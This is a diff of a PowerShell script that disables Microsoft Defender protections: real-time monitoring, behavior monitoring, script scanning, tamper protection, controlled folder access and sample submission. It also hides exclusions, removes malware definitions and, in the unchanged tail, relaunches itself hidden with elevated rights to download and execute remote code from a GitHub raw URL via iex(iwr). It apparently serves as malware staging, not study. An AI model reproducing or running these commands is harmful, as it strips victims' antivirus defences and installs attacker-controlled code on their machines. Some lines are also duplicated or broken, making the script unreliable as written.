@@ -1,25 +1,73 @@
-Add-Type -TypeDefinition @"
-using System; 
-using System.Runtime.InteropServices; 
-public class WindowHelper 
-{ 
-    [DllImport("user32.dll")] 
-    public static extern IntPtr GetForegroundWindow(); 
+#Add-Type -TypeDefinition @"
+#using System; 
+#using System.Runtime.InteropServices; 
+#public class WindowHelper 
+#{ 
+#    [DllImport("user32.dll")] 
+#    public static extern IntPtr GetForegroundWindow(); 
+#
+#    [DllImport("user32.dll")] 
+#    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
+#
+#    public const int SW_HIDE = 0; 
+#    public static void HideWindow() 
+#    { 
+#        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
+#    }
+#}
+#"@; 
+#[WindowHelper]::HideWindow();
 
-    [DllImport("user32.dll")] 
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
+# Disable notifications for scan results
+Set-MpPreference -DisableScanOnRealtimeEnable $true
 
-    public const int SW_HIDE = 0; 
-    public static void HideWindow() 
-    { 
-        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
-    }
-}
-"@; 
-[WindowHelper]::HideWindow();
+# Disable notifications for security intelligence updates
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableScriptScanning $true
+
+# Disable UI Exclusions
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -Type DWord
+
+# Disable UI Exclusions Admin perms
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusions" -Value 1 -Type DWord
+
 Set-ItemProperty -Path $registryPath -Name "DisableAllNotifications" -Value 1 -Type DWord
+
+# Clear definitions of a malware file
+"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+# Disable Script Scanning
+Set-MpPreference -DisableScriptScanning $true
+
+# Disable Intrusion Prevention System
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+
+# Disable real-time protection
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable cloud-based protection
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisablePrivacyMode $true
+
+# Disable automatic sample submission
+Set-MpPreference -SubmitSamplesConsent 2
+
+# Disable various components
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableArchiveScanning $true
+
+# Network Protection
+powershell Set-MpPreference -EnableNetworkProtection AuditMode -Force 
+
+# Disable Tamper Protection
+Import-Module Defender
+Set-MpPreference -DisableTamperProtection $true
+
+# Disable Controlled Folder Access
+Set-MpPreference -EnableControlledFolderAccess Disabled
+
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
     $newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0-wp' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();
